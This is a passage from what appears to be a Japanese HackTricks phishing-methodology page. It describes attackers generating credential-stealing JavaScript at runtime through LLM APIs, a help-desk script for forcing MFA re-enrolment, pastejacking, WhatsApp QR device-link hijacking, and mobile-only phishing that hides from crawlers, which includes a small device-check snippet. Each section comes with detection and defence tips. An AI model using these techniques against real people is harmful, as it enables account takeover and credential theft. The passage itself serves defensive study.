- 通信は、よく知られたLLMドメインや信頼性の高いCDNプロキシを経由する。バックエンドとの通信にWebSocketsを使う場合もある。
- 静的なpayloadは存在せず、悪意のあるJSはレンダリング後にのみ存在する。
- 生成結果が非決定的なため、セッションごとに**固有の**stealerが生成される。

**検出のアイデア**
- JSを有効にしたsandboxを実行し、LLMのレスポンスをソースとする**実行時の`eval`/動的なスクリプト作成**を検出する。
- LLM APIへのフロントエンドからのPOSTの直後に、返されたテキストに対する`eval`/`Function`の実行がないかを調査する。
- クライアントの通信で未承認のLLMドメインが検出され、その後に認証情報のPOSTが続いた場合にアラートを出す。

---

## MFA Fatigue / Push Bombing Variant – 強制リセット
従来のpush-bombingに加え、攻撃者はヘルプデスクへの電話中に**新しいMFA登録を強制する**だけで、ユーザーの既存のtokenを無効化する。その後に表示されるログインプロンプトは、被害者には正規のものに見える。

```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```

AzureAD/AWS/Okta のイベントを監視し、**`deleteMFA` + `addMFA`** が同じ IP から数分以内に発生していないか確認します。



## Clipboard Hijacking / Pastejacking

攻撃者は、侵害された、または typosquatting された Web ページから被害者のクリップボードに悪意あるコマンドを密かにコピーし、ユーザーを誘導して **Win + R**、**Win + X**、またはターミナルウィンドウに貼り付けさせ、ダウンロードや添付ファイルなしに任意のコードを実行させることができます。


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## モバイル Phishing と悪意あるアプリの配布（Android と iOS）


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### QR を利用したソーシャルエンジニアリングによる WhatsApp デバイス連携の乗っ取り
* 誘導ページ（例：偽の省庁/CERT「チャンネル」）に WhatsApp Web/Desktop の QR コードを表示して被害者にスキャンさせ、攻撃者を密かに**リンク済みデバイス**として追加します。<sup>[[12]](#references)</sup>
* 攻撃者は、セッションが削除されるまで、直ちにチャットや連絡先を確認できるようになります。被害者は後になって「新しいデバイスがリンクされました」という通知を目にすることがあります。防御側は、信頼できない QR ページへのアクセス直後に発生した、予期しないデバイス連携イベントを探すことができます。

### クローラーやサンドボックスを回避するモバイル限定の phishing
攻撃者は、デスクトップクローラーが最終ページに到達しないよう、単純なデバイスチェックで phishing のフローを制限するケースが増えています。よくある手法は、タッチ操作に対応した DOM かどうかを判定し、その結果をサーバーのエンドポイントに送信する小さなスクリプトです。モバイル以外のクライアントには HTTP 500（または空白ページ）を返し、モバイルユーザーにはフロー全体を表示します。<sup>[[7]](#references)</sup>

最小限のクライアント側スニペット（典型的なロジック）:

```html
<script src="/static/detect_device.js"></script>
```

`detect_device.js` のロジック（簡略版）：

```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
  .then(()=>location.reload());
```

サーバーでよく見られる挙動:
- 初回読み込み時にセッション cookie を設定する。
- `POST /detect {"is_mobile":true|false}` を受け付ける。
- 以降の GET リクエストでは `is_mobile=false` の場合に 500 (またはプレースホルダー) を返し、`true` の場合のみフィッシングコンテンツを配信する。

ハンティングと検出のヒューリスティック:
- urlscan のクエリ: `filename:"detect_device.js" AND page.status:500`
- Web テレメトリ: `GET /static/detect_device.js` → `POST /detect` → 非モバイルの場合は HTTP 500、正規のモバイル被害者の経路では 200 と後続の HTML/JS が返るシーケンス。
- `ontouchstart` や類似のデバイスチェックだけを条件にコンテンツを表示するページをブロックするか、精査する。

防御のヒント:
- モバイルに似せたフィンガープリントと JS を有効にした状態でクローラーを実行し、ゲートされたコンテンツを明らかにする。
- 新規登録ドメインで `POST /detect` の後に不審な 500 応答が発生した場合にアラートを出す。

## References

- [1] [フィッシングで使われるドメインのバリエーションを生成する方法 (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [フィッシングを見つける: ツールとテクニック (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [noVNC を使って認証情報を盗み、2FA を回避する (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [EvilnoVNC でセッションを盗み、2FA を回避する (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Debian Wheezy で Postfix に DKIM をインストールして設定する方法 (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [2025 Unit 42 グローバルインシデント対応レポート – ソーシャルエンジニアリング編](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [サイレント Smishing – モバイル向けにゲートされたフィッシングインフラとヒューリスティック (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [ランタイム・アセンブリ攻撃の新たなフロンティア: LLM を活用したリアルタイムのフィッシング JavaScript 生成](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [なりすまし、クリックジャッキング、TDS: マルウェア配布エコシステムの内部](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Windows.com の Bitsquatting (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [ビット反転による Microsoft の windows.com 宛てトラフィックのハイジャック (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [恋? それとも本当に? パキスタンを標的としたスパイウェアキャンペーンで、おとりとして使われた偽の出会い系アプリ](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [ESET GhostChat の IoC とサンプル](https://github.com/eset/malware-ioc/tree/master/ghostchat)
- [14] [AdFection の実態: Discover-Tech がターゲティング広告をゼロクリック型傭兵スパイウェアの供給網に変えた方法](https://citizenlab.ca/research/how-discover-tech-turned-targeted-ads-into-a-pipeline-for-spyware/)
{{#include ../../banners/hacktricks-training.md}}
